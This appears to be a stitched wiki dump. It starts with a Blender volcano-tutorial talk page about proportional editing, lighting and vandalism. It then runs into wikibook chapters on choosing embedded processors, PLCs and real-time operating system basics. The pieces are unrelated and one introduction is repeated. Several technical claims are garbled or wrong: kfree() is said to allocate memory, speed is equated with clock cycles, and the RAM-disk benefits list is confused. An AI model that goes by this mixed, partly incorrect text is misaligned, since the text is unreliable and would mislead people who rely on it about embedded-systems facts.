'''Please Answer ASAP''', I need to know how to change the size of the circle from the '''OKEY''' and then grab without a mouse wheel. I have a laptop mouse and can't complete the tutorial.

That's bad, I actually have no idea on how to work with blender without a mouse wheel, sorry. Perhaps there exists a solution somewhere in the internet, you might find one.
Wish you luck. [[User:Morrolan|Morrolan]] ([[User talk:Morrolan|talk]]) 16:30, 16 June 2010 (UTC)

I beleve I read that you can set the mouse in the control panel to emulate a 3 buttin mouse, by pressing the left and right button at the same time [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 01:40, 27 July 2010 (UTC)

Hi, You can also use the &quot;Page Up&quot; and &quot;Page Down&quot; keys to increase and decrease the circle of influence or the &quot;O Key&quot;

**nor value at .50 makes no sense. i pushed the pedal down to 50 and got a stunning-looking volcano. try it.**

== Volcano Chapter ==

The whole lighting issue around the magma needs to be more clear, there seems to be conflicting info in the chapter.  Each method for lighting the magma needs to be spelled out better and needs to include images that help explain the method.

The materials section needs a translation into 2.5 as the whole materials/textures thing is handled quite differently.

Cheers,

John


Hopefully this is fixed now. Each suggestion was basically recommending a different lamp type (spot, area, etc), so I got rid of the narrative forms and made a list of instructions. I tried incorporating all of the edits, but I left out the user who mentioned SpotSi since I couldn't figure out what that meant.

The materials section has been updated to 2.6.x, but as I am learning 3D modeling for the first time as I go through this tutorial, this section is most likely uninformed / incomplete.

== Vandalism ==
I saw something that struck me as out of place, the sentence was:&lt;BR /&gt;
&quot;We are going to model a volcano using the proportional edit fallOUT 3 tool.&quot;&lt;BR /&gt;
I checked the revision history and falloff had become fallOUT 3 with the most recent change http://en.wikibooks.org/w/index.php?title=Blender_3D:_Noob_to_Pro/Modeling_a_volcano&amp;oldid=2169051. I changed it back and it is pending review.

Processor technology involves the architecture of the computation engine used to implement a system’s desired functionality. All devices we know have processors embedded in it (microwave, cars ...). Choosing the right embedded processor is critical to perform the wanted operations.

=Trends=
Nowadays hardware is more and more like software. It can easily be programmed and integrated with other components by an end-user. One simple example is a [[w:Field-programmable_gate_array|FPGA]] which has many more components than it should have so in that way it can be programmed for various applications. It can also be used as an interface for the communication of several hardware components, for instance the integration of a [[w:Digital_Signal_Processor|DSP]] and a hybrid CPU on a mobile phone chip.

Another important trend is a modular design. This means that hardware components are designed as separate parts and can be put together in one device. In this way the device is only programmed for the control and communication of the different components. This has the following advantages:

*Components can easily be replaced when broken
*Adding new functions (upgrading) is very simple
*A small step towards standardization

In the domain of mechatronics standardization is not yet that common. Electronics however is some kind of a pioneer because we can find there many examples of standardization: [[w:VHDL|VHDL]], standard components like adders, multiplexers, registers, memory … One simple example here is [[w:National_Instruments|National Instruments]]. As time evolves this standardization will also be needed in the mechanical world.

==Specific branches==
In automotive there is a trend towards centralization. This is because designers have noticed in the past that there were too many parts that required their own controller. So now they are trying to use as few as possible CPU’s. The design is thus more and more focused on the communication busses between the several components which are controlled by only a few CPU’s.

In aviation the requirements are very different. First of all safety is very important. In this way standardization and certification becomes very important. One simple example is the fact that in aviation they only use certified hardware. They still use a Pentium II because this is proven technology.

=Choice of hardware=
When one reached the moment at which a choice has to be made about the processor technology, one can choose between 5 categories of processors, each with its own advantages and disadvantages:
*General purpose processor: usable for several applications, low price, short design time but low performance, high energy consumption and large dimensions
*Single purpose processor: good performance, small, less energy consumption but more difficult design, more expensive, less flexible
*[[w:Application_Specific_Instruction_Set_Processor|ASIP]]: intermediate solution between single and general purpose processor
*[[w:Programmable_logic_device|PLD]]: low design cost, fast product development, available in large numbers but more energy consumption than ASIP. Some examples are: [[w:Programmable_logic_array|PLA]], [[w:Field-programmable_gate_array|FPGA]]
*[[w:Programmable_logic_controller|PLC]]: usable in several working conditions, more standardised but not suited for complex calculations, relative expensive

Besides the choice of processor the designer also has to look for the right communication and storage technology. One example of robust storage technology are solid state hard disks. They are resistant against vibrations, magnetic fields and dirt so they can be used in several working conditions.  Examples of communication technology are given by USB, Firewire, [[w:Controller_Area_Network|CAN-Bus]], Ethernet ...

------------------------------------------------------------------------------------------------------------------------------------------------------











Processor technology involves the architecture of the computation engine used to implement a system’s desired functionality.  
Most devices we know have processors embedded in it (microwave, cars…). Choosing the right embedded processor is critical to perform the wanted operations.
The choice of a processor in a design process can take place on 2 moments.   Either you choose a processor in the beginning of the design when you only had a peak on your specifications, this means that throughout the next stages of your design you will need to adapt the wanted functionalities to the processorpossibilities.  This is the case for instance when you have a fixed budget for the processor, choose the one with the highest possibilities which fits the budget.  Or you make the decision at the end of the project, so you know all the necessary functions you want to implement and you can choose a processor type which fits your situation exactly.
If possible you must always choose the processor which you have the most experience with to minimise design time and avoid problems.   Minimising design time equals less design cost and faster time-to-market.


First we will make an overview of some terms and concepts you should keep in mind when choosing a processor.
Then we will look at the different types of processor technology available for the moment and take a peak at the available processors today.
And in a third part of this chapter we’ll discuss the programmable logic controller (PLC).

In the text there will be references to interesting articles,sites and links where you can find a clear explanation and a broader view about the subject.  In the text they are shown as numbers which refer to a site shown in the reference list.
A list of all the references is at the bottom of this chapter.


=Terms, questions=

===Performance/speed  of a processor===
This means the number of clock cycles per second.  It determines the number of instructions performed each second.
If your processor demands more than processortechnologie can offer, a single processor will not do it anymore.
Then it's time to think of a dual-core processor.  This will not only double the computational load, but provides flexibility in how software is architedted across the cores, which can even result in reducing power consumption versus a single core running at twice the frequency.

===compatible===
*electronic compatibility
all hardware selected should be able to communicate with each other 
*environmental compatibility
The environment in which the processor has to work can be damaging, so precautions must be taken to avoid unexpected failures
*Connection is realised by [[Embedded_Control_Systems_Design/Field_busses | busses]]

===Input/Output===
For this you should take a look in [[Embedded_Control_Systems_Design/Hardware_peripherals| Hardware Peripherals]]

===fixed-point/ floating-point device===
These are 2 categories of processor computation arithmetic.  
In general: 

Fixed-point: 
*faster
*more power-conscious
*cost-sensitive

Floating-point:
*high precision
refers to the granularity with which a fraction can be defined
*dynamic range
refers to the ratio between the largest and smallest numbers that can be represented in a numeric format 

===memory===
*[[w: CPU_cache |Cache]]: Is used by the processor to reduce the time needed to communicate with the (main) memory. 
*[[w: Memory_address|Memory address]]
*[[w: Random_access_memory|RAM]] (random access memory)
*[[w: Read-only_memory|ROM]] (read only memory)

===Are my system needs changing in time===
*Yes : then a programmable solution will probably required ( DSP, MCU, FPGA) 
Example: changes for user interface features
*No : an ASIC might be suitable

===life time===
required lifetime depends on wanted lifetime of the system, willingness to replace the controller or desire to reuse the controller in other systems

===how do I develop on the processor===
If you use a good, easy development tool you will increase productivity and decrease development/debug time. 
This is also dependant of the experienced personnel you have (which are more expensive) and the experience your company has with certain processortypes.
Off course when you use code that is written in a common known language it can be easily ported to a new processor and increases the possibility of expanding and rewriting the program.

===power consumption===
A device can get his power from the electric net or can work on a battery.
This restriction (battery) usually involves a tradeoff between performance and power efficiency.
Choosing a system with a battery we need to take in account the weight of the battery, time between recharge and safety.

===Real-Time Aspects===
*[[w:Interrupt|Interrupts]] and [[w: Interrupt_vector|interrupt vectors]] 
*Support for ‘atomic operations’ ~ [[w: Mutex| mutex]] (=mutual exclusion) such as [[w: Test-and-set|Test and Set]] and [[w:Compare-and-swap|Compare and Swap]] 
*[[w:Granularity#In_computing |Granularity]] 
*[[w:Privilege_%28computer_science%29 |Privilege levels]] and [[w:CPU_modes|CPU modes]]
***For the most common processortypes:
*Microprocessor: When a microprocessor is selected together with an embedded operating system, the operating system is the cause of real-time operations not being straight-forward.
*Microcontroller: Being a very simple microprocessor, real-time operations are difficult.
*DSP: When real-time is important such as in signal processing (audio, video…) the DSP will perform the best.
*FPGA: An FPGA can be configured in such a way that it performs completely like a microprocessor or completely like a DSP.  So real-time performance is depending on whether a DSP-like configuration is chosen.
*PLC:  A PLC gets his input from the sensors, evaluates these and makes changes (output), thus it acts as a real-time system

===operating system===
An operating systems manages the system: managing and processing I/O, memory management, controlling simultaneous processes.
If so, make sure your processor supports the OS you chose.

&lt;/ref&gt;





=types of processor technology=
In this part we will discuss the general processor types, their characteristics and examples

Interesting links for choosing the right processortype for your application: &lt;ref name=&quot;katz&quot; /&gt; [http://www.smallformfactors.com/departments/fundamentals/2006/Winter/]

==general purpose processor==
The system designer only needs to program the processor’s memory to carry out the required functionality: software portion.
These types are created to produce large numbers for a variety of applications

Here are some general characteristics from a general purpose processor:
*Advantages:
***easy to design and use (only programming the memory)
***design time is thus low
***design cost is thus low
***reprogrammability  (changing functionalities or improving a system becomes easy when you only need to change the program)
*Disadvantages:
***performance is not very good
***size is high ( because they are built to be used in a variety of applications with different specifications and all these specifications must be possible on the processor)
***they consume much power

Usually they are used to put in a product the first time it goes to the market, because of their cheap design cost and ease to use.
Because of the use of code, a designer usually strives to minimize compiled code size, rather than maximize performance.

*example:[[w:Microcontroller|Microcontroller]] (MCU), [[w:Microprocessor|Microprocessor]] 

Basically a microprocessor performs all the tasks that must be accomplished by a microcontroller/embedded system.  A general microprocessor consists of a bus unit which is a pathway to communicate with the (computer) memory, an instruction cache to keep track of instructions coming from the computer memory through the bus unit, a (pre)fetch unit copying instructions from the instruction cache for further processing, a decode unit getting instructions from the prefetch unit that will be converted to a binary code understood by the processor, a control unit that performs tasks or instructions which are comprised in the binary code coming from the decode unit , ‘data cache’ to save instructions or data, an ALU (arithmetic logic unit) that executes mathematic operations such as adding, multiplying…, and finally registers which are also some memory used by the ALU to store the results of performed operations.
A microcontroller does not have a data bus or bus unit as described above for a general microprocessor.  The reason is that there is no need to communicate to memory because memory is incorporated on the same chip as the microprocessor itself.
A MCU is typically used as a systems controller, with many conditional operations and frequent changes in program flow. 
The MCU code is written in C or C++.
There’s a wide variety of MCUs available: from 4-bit, 32 kHz models to 32-bit, 500 MHz devices, and beyond(The &quot;-bit&quot; designation refers to the width of a device's data bus, registers, execution units, etc.) 

If you choose an embedded operating system (Windows, Linux, Dos...) a microprocessor is needed.  But for real-time operations you better not use a microprocessor.  The microcontroller is actually a low-end microprocessor, and is used in more simple tasks (traffic light to hold the light for a certain time...)

==single purpose processor==
This type of processor is designed to execute exactly one program.  
An embedded designer creates a single-purpose processor by designing a custom digital circuit
Advantages and disadvantages are more or less  the opposite of the general-purpose processor:
*Advantages:
***performance is very good
***small size (exact to fit one solution)
***they consume little power
*Disadvantages:
***not very easy to design and design time is thus high
***design cost is thus higher
***reprogramming is difficult
***limited flexibility: not easy to make changes, accommodate features

In design we can make a difference between standard single-purpose processors and custom single-purpose processors (ASSP). 
The standard single-purpose processors (hardware peripherals) are explained in a different chapter [[Embedded_Control_Systems_Design/Hardware_peripherals| Hardware Peripherals]].   They are used for in a wide variety of applications for the same task.

*example: [[w:Application-specific_integrated_circuit|application-specific integrated circuit (ASIC)]],[[w:Application_specific_standard_product|application-specific standard product (ASSP)]]

They are designed to fit the specific requirements of an end product.   In the design process they will be optimised for both power and performance.
An ASIC is introduced for a product usually after a product is stabilised on the market (with non-ASIC solution), because of the higher development time and cost.  After the stabilisation the producer can look for extra margin by making the processor as good as possible for his application.   
A disadvantage is that when you make a mistake, you will need to make a whole new chip, but for a general-purpose processor you just change the code and recompile.  You can use an ASIC in a stable market where technology and requirements aren't going to change rapidly.

==application specific instruction-set processor (ASIP)==
An ASIP is designed for a particular class of applications with common characteristics
it’s an 'intermediate' solution between a general-purpose and a single-purpose processor and gives more flexibility than a single purpose processor and still better performance, power, size than a general purpose processor.
Of course this leads to a longer design time (cost) and there's also a compiler problem, you will have to create your compiler usually yourself.

*example:[[w:Digital_signal_processor|Digital signal processor (DSP)]] 
A DSP is optimized to efficiently perform repetitive and numerically intensive tasks such as matrix operations, convolution for filtering in real-time, because of the performance limitations of the MCUs. DSPs can run at very high clock rates, and they are often compared in terms of how many millions of MAC operations they can perform per second. This metric is known as &quot;mega MACS,&quot; or MMACS. 

A DSP is optimized to do mathematical operations, but not for supervisory control. Thus, DSP-based systems are integrated with the slower MCUs, this can be done in 2 ways:
**Discrete DSP + MCU (separate in the system)
***Advantages:
****design of DSP and MCU separate from each other
***Disadvantages:
****hard partitioning between control and DSP function, if there are too many instructions for the DSP, the MCU can’t take over
****the DSP and MCU require different development tools 
**Convergent Processor [http://www.dspdesignline.com/howto/showArticle.jhtml?articleID=187203618](a convergent processor is optimized both for computation on real-time data flows, and for control-oriented tasks)
***Advantages:
****optimised for computation on real-time data flows as well as for control-oriented tasks
****high clock rates
****lower power dissipation
***Disadvantages:
****mixing a control application with signal processing on the same device, non-real-time tasks may interfere with time-critical tasks
****the skills of developers must be higher

==programmable logic device (PLD)==
A processor exists of layers :  the bottom layer are the transistors, if you connect the transistors you get logic gates and by connecting these you can make a circuit.
In a PLD all layers already exist, the layers implement a programmable circuit, where programming has a lower-level meaning than a software program.

There are 2 types of [[w:Programmable Logic Device|Programmable Logic Device]]: 
*simple PLD’s
**[[w:Programmable Logic Array|Programmable Logic Array (PLA)]]
*** A PLA consists of a programmable array of AND gates and a programmable array of OR gates. 
**[[w:Programmable Array Logic|Programmable Array Logic (Pal)]]
*** A PAL consists of just one programmable array to reduce the number of expensive programmable components.
*complex PLD’s
**[[w:CPLD|CPLD]]
*** A CPLD consists of ...[Fixme: definition]
**[[w:Field-programmable_gate_array|field programmable gate array (FPGA)]]
*** A FPGA offers more general connectivity among blocks of logic, rather than just arrays of logic as with PLA’s and PAL’s, and are thus able to implement far more complex design.
Advantages of programmable logic devices over full-custom chips:
**low design cost (fast product development)
**almost instant availability
*Disadvantages
**higher unit cost
**bigger than ASICs
**consume more power

*example: FPGA
There’s a large base of standard building-block libraries available for signal processing(fast development)   FPGAs like ASICS optimise hardware for a specific end product.  They can also perform massively parallel computation (a MCU or DSP can’t). 
Because of their power consumption and cost, they shouldn’t be used in portable or cost-sensitive systems.{{fact}}
The FPGA is able to talk to any external device thanks to it’s configurable nature.
An ASIC can be created based on an FPGA implementation

For more details, see [[Programmable Logic]].

== Trends for tomorrow ==
*[[w:Multi-core |Multi core CPUs]] 
*[[w:Cell_processor |Cell processor]] 
*[[w:Graphics_card|GFX cards]]: With the increase in processing power available on these cards it becomes interesting to use them for  more than just graphics processing alone.  They are especially good at [[w:Parallel_computing |parallel processing]]  and can be used as [[w:Stream_processing|stream processors]], they are then often referred to as [[w:GPGPU|GPGPUs]]. Currently only the [[w:CUDA|NVIDIA CUDA]] and the [[w:Close_to_Metal|ATI/AMD CTM]] systems are available.
*[[w:ulti-processor|Multi processor]] solutions: It is possible to use several different processors for controlling a system on different levels.  For instance: microcontrollers can be used for low level local control, they can receive commands from a higher control level which might be implemented on an embedded cpu, which in turn can be reprogrammed with a general purpose cpu somewhere in a control room.

=Programmable Logic Controller (PLC)=
The [[w:Programmable Logic Controller|Programmable Logic Controller]]  was born out of the need for a device which would eliminate the large cost involved in adjusting and replacing complicated relay based machine control systems.
Programmable logic controllers are specialized industrial computers.  The PLC is a real –time device: inputs from switches and sensors, evaluating these based on a program (logic) and changing the state of outputs to control a machine or process.
==Advantages==
A PLC is very simple in its use: programming, wiring, installation and changes are simple and quick.
Another important feature of the PLC are its environmental possibilities:
A PLC is designed for:
* Extended temperature ranges
* Dirty or dusty conditions
* Immunity to electrical noise
* Resistance to vibration and impact
A PLC exists not only out of a processor, but also the I/O arrangements:
All PLCs contain six basic components:
**Processor or CPU
**Rack or mounting
**Input assembly (sensors can be analog or digital)
**Output assembly
**Power supply
**Programming unit, device (PC)

==PLC Program==
The CPU executes a program.  This logic can be written in Ladder Logic, Instruction List, Sequential Function Charts or any of the IEC languages.
* Early PLC's: [[w:Ladder logic|Ladder Logic]]
* Recently IEC standard 61131-3 defines five languages
** FBD ([[w:Function block diagram|Function Block Diagram]])
** LD ([[w:Ladder logic|Ladder Diagram]])
** ST ([[w:Structured text|Structured Text]])
** IL ([[w:Instruction list|Instruction list]])
** SFC ([[w:Sequential function chart|Sequential Function Chart]])
The program will be downloaded to the PLC.

==I/O capabilities==
The main difference between a modern PLC and other processors are the I/O arrangements. These connect the PLC to sensors and actuators. Based on these arrangements PLC's can be divided into three groups: Modular, Rack and P2P.
*[[w:Module|Modular]] PLC's
Modular PLC's have a limited number of connections built in for inputs and outputs (digital as well as analog). Expansions are available if the base model does not have enough I/O connections.
*Rack-style PLC's
Rack-style PLC's have processor modules with separate I/O modules which may occupy many racks. These often have thousands of discrete and analog inputs and outputs. Often a high speed serial I/O link is used so that racks can be remotely mounted from the processor, reducing the wiring costs for large plants.
*[[w:P2P|P2P]] communication
In larger I/O systems, PLC's may have P2P  (peer to peer) communication between processors.  This allows separate parts of a complex process to have individual control while allowing the subsystems to coordinate over the communication link.

==Communication==
**I/O-modules can communicate with a PLC's [[w:Central Processing Unit|CPU]] by:
***Backplane
The I/O modules can be located in the same rack of station.  Communication then takes place within the rack or across the backplane.
***Backplane extension
Backplane extension modules allow I/O modules to be located in racks or stations which are separated from the controller
***Device network
Modules can communicate with a controller over a network.  Industrial networks are used to interconnect field level devices with controllers.  ( [[w:Fieldbus|FieldBus]], [[w:Profibus|ProfiBus]] and [[w:DeviceNet|DeviceNet]])
**between PLCs:
***serial communication
***industrial communications network
***industrial I/O network

==disadvantages==
*it cannot handle complex situations
*expensive, so it's not a good idea in mass-production
*There's need for maintenance

==Trends==
To be able to handle more complex situations there is an evolution in the direction of the PC ([[w:Programmable Automation Controller|PAC: programmable automation]] )  The boundary between PC and PLC is becoming less clearly-cut.  
The languages also became more complex while evolving towards a more complex PLC.

==Definition==
An operating system is a computer program that manages the hard and software resources of a computer. It provides the interface between application programs and the system hardware. In general, an OS for embedded control systems has the following responsibilities: [[w:Task_manager|Task management]] and [[w:Scheduling_(computing)|scheduling]], [[w:interrupt|interrupt servicing]], [[w:Inter-process_communication|inter process communication]] and [[w:Memory_management|memory management]]. These detailed topics will be discussed later on, as we first start with a more general approach of operating systems.

== Necessity of an operating system ==
When choosing an operating system for an embedded control system, the first question that should be asked is: Is an operating system really necessary? 
For simple tasks or systems that only have to do one job, it might be easier and more efficient to create a program that runs directly on the [[Embedded_Control_Systems_Design/Processors|microprocessor]], perhaps using a [[Embedded Systems/Super Loop Architecture|super-loop architecture]]. An operating system will be needed when the embedded control system has to perform more complex tasks or be able to connect or interface with other devices for example. An operating system will allow for more flexibility. The following list gives an overview of the most common real time operating systems.

==List of real-time operating systems==
* [[w:Linux|Linux]] based [[Embedded_Systems/Real-Time_Operating_Systems|real-time operating systems]] :

== Things to consider when choosing an operating system==
To facilitate the choice of the operating system, the following things can be considered:
* Compatibility: Not every operating system works on any kind of microprocessor! So when choosing an operating system, one should already have an idea of the available hardware. 
* System Requirements and Footprint: The [[w:Memory-footprint|footprint]] of an embedded system is the total size of the system. For example, if the total size of an embedded control system is 600 kB, it can be said that the system's footprint is 600 kB. This is a small footprint, larger footprints would be in the order of some MB. A system's footprint has to be considered to make sure that the available hardware is able to support the system.  
* [[Embedded_Control_Systems_Design/Software_toolchain | Software]] support: An other important factor in the choice of an operating system is the available supporting software. Are there many editors, compilers and libraries, or only very few? This is related to the next point on the list;
* Amount of users: If one operating system is used by many people, there will be more available software for this system. It will also be easier to find documentation, solutions for specific problems or people that are using the same operating system. 
* Availability of device drivers
* Possibility to dynamically add code: Sometimes it might be necessary to add programs to the already working system. Does the operating system allow this?
* Certification: Some specific applications demand that the operating system is certified for use in that particular application. An example is the use of an operating system that will be used in space (satellites, rockets...)
* Soft/Hard real-time: How important is it that timing constraints are met? In soft real-time, it is not a disaster (but not desirable) that a calculation is not completed within the specified time. Examples are audio and video playing. Nobody will notice a delay of a few microseconds. In hard real-time there is no exception: the system has to meet the specified timing constraints. Hard real time systems are for example surgical robots, space probes or precision mills. 


When choosing an operating system, the following trends can also be considered:

* Remote access: More and more it is a necessity that the system can be remotely accessed. Manufacturers that ship their machines all over the world cannot go to every location where there is one of their machines installed if they want to access the control system. Therefore remote accessing becomes increasingly important. 
* [[w:Safety_Integrity_Level|Safety Integrity Level]]: The safety integrity level is a relative measure of the reliability of a system. Systems that control dangerous processes should have a high SIL rating. To reach that SIL level, specific demands on soft and hardware are made. This can also affect the choice of an operating system.  
* Development of operating systems: There used to be hundreds of embedded operating systems available. When Microsoft introduced their [[w:WinCE|WinCE]] system, a lot of systems disappeared, and programmers of different systems combined their efforts to create a common embedded operating system, thus further reducing the number of available systems.

== Operation system basics==

This section aims at a more detailed discussion of the basics of an operating system. As mentioned, the important tasks an embedded operating system has to do are: Task management and scheduling, interrupt servicing, inter process communication and memory management.

=== Task management and scheduling===
A task (= process or thread) is an instance of a computer program that is being executed.
While a program itself is just a passive collection of instructions, a process is something which actually executes those instructions. 
Several processes can be associated with the same program - each would execute independently. 
Modern computer systems allow multiple processes to be loaded into memory at the same time and, through time-sharing (or [[w:Computer_multitasking|multitasking]]), give an appearance that they are being executed at the same time even if there is just one [[w:Central_processing_unit|processor]].      

The difficult part in task management is to make sure that a specific task can exit without blocking other tasks. A task indeed should not be deleted blindly, because it shares a lot of its components with other tasks, so its memory space and locks should not be released when its causing tasks are still using them.

In general, multiple tasks will be active at the same time. The OS is responsible for sharing the available resources (CPU time, memory, etc.) over the tasks.
The CPU is one of the important resources, and deciding how to share the CPU over the tasks is called scheduling.

The simplest approach to the scheduling problem is to assign ''static properties'' to all the tasks. That means that the priority is given to the task at the time it is created.
Sometimes however, dynamic properties are assigned to a task: the schedule-algorithm has to calculate the task's priority on-line, based on a number of dynamically changing parameters (time till next deadline, amount of work to process, etc.).
It's obvious that scheduling is pure overhead: all time spent on calculating which task to run next is lost for the really productive tasks.

=== Interrupts===
An operating system also has to be able to service peripheral hardware, such as timers, motors, sensors, communication devices, disks, etc. All of those can request the attention of the OS ''asynchronously'', i.e. at the time that ''they'' want to use the OS, the OS has to make sure it's ready to service the requests. Such a request for attention is called an '''''interrupt'''''.

There are two kinds of interrupts :
* ''Hardware interrupts'': the peripheral device can put a bit on a particular hardware channel that triggers the processor on which the OS runs, to signal that the device needs servicing. The result of this trigger is that the processor saves its current state, and jumps to an address in its memory space, that has been connected to the hardware interrupt at initialization time.
*''Software interrupts'' or ''Synchronous interrupt'': many processors have built-in software instructions with which the effect of an hardware interrupt can be generated in software.  The result of a software interrupt is also a triggering of the processor, so that it jumps to a pre-specified address. Examples of cases where software interrupts appear are perhaps ''a divide by zero'', a memory segmentation fault, etc. So this kind of interrupt is not caused by an hardware ''event'' but by a specific ''machine language operation code''. A synchronous interrupt is often called a ''trap''.

Many systems have more than one hardware interrupt line, and the hardware manufacturer typically assembles all these interrupt lines in an ''interrupt vector''. Hardware and software interrupts do share the same interrupt vector, but that vector then provides separate ranges for hardware and software interrupts.

An ''Interrupt Controller'' is a piece of hardware that shields the OS from the electronic details of the interrupt lines. Some controllers are able to queue interrupts, such that none of them gets lost.

We discuss interrupts in more detail in other chapters of this book,
[[../Real Time Operating systems#Interrupt servicing]] and
[[../Design Patterns#Interrupts]].

=== Inter process communication===
Different tasks sometimes need to be synchronized, e.g. the sequence in which they are executed is important. It is also possible that tasks need to exchange data. An example is a peripheral device from which the data is processed by a dedicated task, which in turn passes the result on to another task. Synchronization and data exchanged are together called inter-process communication. An operating system should provide a wide range of inter-process communication primitives, so that tasks can easily be synchronized, or exchange data. 
*  Synchronization 
** [[w:Semaphore|Semaphore]] &lt;br&gt; A Semaphore is a protected variable (or abstract data type) and constitutes the classic method for restricting access to shared resources (e.g. storage) in a multiprogramming environment. It was invented by Edsger Dijkstra and first used in the THE operating system. The value of the semaphore is initialized to the number of equivalent shared resources it is implemented to control. In the special case where there is a single equivalent shared resource, the semaphore is called a binary semaphore. The general case semaphore is often called a counting semaphore. Semaphores are the classic solution to the [http://en.wikipedia.org/wiki/Dining_philosophers_problem dining philosophers problem], although they do not prevent all deadlocks.
** [[w:Mutex|Mutex]] &lt;br&gt; The term mutex is short for &quot;mutual exclusion&quot;, and is a type of mechanism used in a preemptive environment that can prevent unauthorized access to resources that are currently in use. Mutexes follow several rules: Mutexes are system wide objects, that are maintained by the kernel. Mutexes can only be owned by one process at a time. Mutexes can be acquired by asking the kernel to allocate that mutex to the current task. If a Mutex is already allocated, the request function will block until the mutex is available. In general, it is considered good programming practice to release mutexes as quickly as possible. 
** [[w:Condition_variable#Condition_variables|Condition variable]] &lt;br&gt; To avoid entering a busy waiting state, processes must be able to signal each other about events of interest. Monitors provide this capability through condition variables. When a monitor function requires a particular condition to be true before it can proceed, it waits on an associated condition variable. By waiting, it gives up the lock and is removed from the set of runnable processes. Any process that subsequently causes the condition to be true may then use the condition variable to notify a process waiting for the condition. A process that has been notified regains the lock and can proceed.

*  Data exchange
** [[w:Buffer_(computer_science)|Buffers]] &lt;br&gt; A buffer is a region of memory used to temporarily hold output or input data, comparable to buffers in telecommunication. The data can be output to or input from devices outside the computer or processes within a computer. Buffers can be implemented in either hardware or software, but the vast majority of buffers are implemented in software. Buffers are used when there is a difference between the rate at which data is received and the rate at which it can be processed, or in the case that these rates are variable, for example in a printer spooler.
** [[w:FIFO|FIFO]] &lt;br&gt; This term refers to the way data stored in a queue is processed. Each item in the queue is stored in a queue (simpliciter) data structure. The first data to be added to the queue (enqueue) will be the first data to be removed (dequeue), then processing proceeds sequentially in the same order. 
** [[w:Message_(computer_science)|Messages]] &lt;br&gt; Message passing is a form of communication used in concurrent programming, parallel programming, object-oriented programming, and interprocess communication. Communication is made by the sending of messages to recipients.

=== Memory management===

'''Terminology'''

When executing a task the system is in need of [[w:RAM|RAM]] memory. This RAM memory is mainly used for code, data management and IPC ([[w:Inter-process_communication|Inter-process communication]]) with other tasks. The RAM makes it seem as if the task is the only one that is claiming the memory while running. Summarized it has three main tasks:
* making the memory larger than it seems.
* distributing the memory over a various of pages.
* protecting the memory from access by other tasks.

When considering these general Operating System requirements, one has to keep in mind that they are not the concerns of real-time systems. The real-time requirements which have to be fulfilled are:
*Fast and deterministic memory management: The fastest memory management is off course no memory at all. This means that the program can use all the physical RAM. This approach is only useful when programming small [[w:Embedded_systems|embedded control systems]].

*[http://www.service-architecture.com/database/articles/page_locking.html Page locking]: Each task is getting a fixed number of pages in the RAM. Pages that hasn't been used recently are swapped out by a non deterministic process. When a task needs code or data from a swapped page, the system has to retrieve this page from the disk, which often requires another page in the RAM to be swapped out. This means the system has to lock pages of real time tasks. Otherwise there's a good chance that the necessary pages are being swapped out during the process. Page locking is thus a Quality of Service which means that each tasks gets the amount of memory it requires.

*[[w:Dynamic_allocation Dynamic|Allocation]]: It is always possible that a task is in need of more memory somewhere during the process. This extra memory is provided by a [[w:Memory_pool|pool]] of free pages locked in the physical RAM. One has to be careful using this approach. It is never garantueed that there are enough free pages available in the memory pool.

*[[w:Memory_mapping|Memory mapping]]: Realtime and embedded systems have to access [[w:Peripheral_device|peripheral devices]]. These devices store their data in onboard registers. The registers then have to be mapped in the address space of the corresponding device driver task.

*[[w:Shared_Memory|Memory sharing]]: shared memory allows different tasks to communicate with each other. The Operating system deallocates the shared memory and synchronizes access to that memory.

*[[w:Ram_disk|RAM disks]]: These disks can be used to emulate a hard disk. This means that memory is organized and entered as a file system. The benefits of this kind of memory management are:
# avoiding non-deterministic overhead of accessing hard disks.
# no extra cost.
# no extra space needed.
# no reduction of robustness of mechanical disk devices.

*[[w:Flash_memory|Flash disk]]: When a system is in need of data preservage while the power is switched off, the designer has to use flash disks. These disks can be burned repeatedly and they keep their memory when there is no power. The flash memory is loaded from within the system itself.

*Stripped Libraries: RAM is scarce, so designers prefer to use stripped down versions of general utility libraries i.e. [[w:C_library|C library]], [[w:GUI|GUI library]] etc...

'''Shared memory in [[w:Linux|Linux]]'''

There are various ways to allocate shared memory in Linux. When using [http://www.rtlinuxfree.com/ RTLinux] allocating is allowed, when using [https://www.rtai.org/ RTAI] it's not.

*Allocation at boot time: a block of shared memory can be reserved at boot time. This means that Linux cannot access it for general purposes. There is one problem though, boot-time allocation is not the best option for the average user: when only available for code linked in the image of the [[w:Kernel_%28computer_science%29|kernel]], a device driver using this allocation can only be installed or replaced by rebuilding the kernel and rebooting the computer. 

*[http://docs.blackfin.uclinux.org/doku.php?id=kernel_space_memory_allocation Allocation in kernel space]: using this approach means that the memory does not have to be ready at boot time. Also there isn't a limit of the memory size. Unfortunately this isn't a real time process.

*[http://linux.about.com/od/lkm_howto/a/hwtlkm11t06.htm Allocation in module]: In Linux there is an option called ‘Loadable Module Support’. This means that Linux can be divided in different [[w:Kernel_module|modules]] that can be accessed and called. These modules are actually bits of code which places the kernel in the memory and takes it back out if wanted. This approach is preferably used at boot time.

=== Device drivers===

The main goal of a [[w:Device_driver|device driver]] is to allow communication between the operating system and the peripheral devices. It also provides a link between the kernel software and the user software. It's important to achieve a sort of systematic way to do this. This makes the interface more recognizable for the user. The driver has the responsibility of hiding the details of the hardware from the operating system and, ultimately, from the user. This chapter will discuss a few of the available device drivers for embedded control systems.

'''Mechanism and policy'''

A device driver must provide mechanism, not policy. It has to supply the interfacing capabilities but nothing more (mechanism). A driver leaves the data alone, it may never alter a data stream (policy). It only makes it possible to use a device in a particular way.

'''Available device drivers'''

*[[w:Unix|Unix]] device drivers: In Unix a device driver is actually part of the Unix kernel. This makes the drivers somewhat different from standalone programs. The kernel exists out of base code plus driver code that helps the system communicating with the hardware. The following steps have to be checked when writing a device driver in Unix:
**[[w:Namespace_%28computer_science%29|Namespace]]: before writing any code it is important to name your device.
**[[w:Memory_allocation|Memory allocation]]: the [http://man.he.net/man9/kmalloc kmalloc()] function is used. This means that memory is provided in pieces whose size is a power of two. There is a limit to this namely 131056 bytes. Also, kmalloc() requires a second argument: [http://www.linuxjournal.com/node/1133/printa priority]. [http://puggy.symonds.net/~abhi/files/mm/node88.html Kfree()] will then give you the opportunity to allocate memory.
**[[w:Character_device|Character vs. block devices]]: these are the two main types of devices under Unix. Character devices use no buffer and block devices are accessed via a cache.
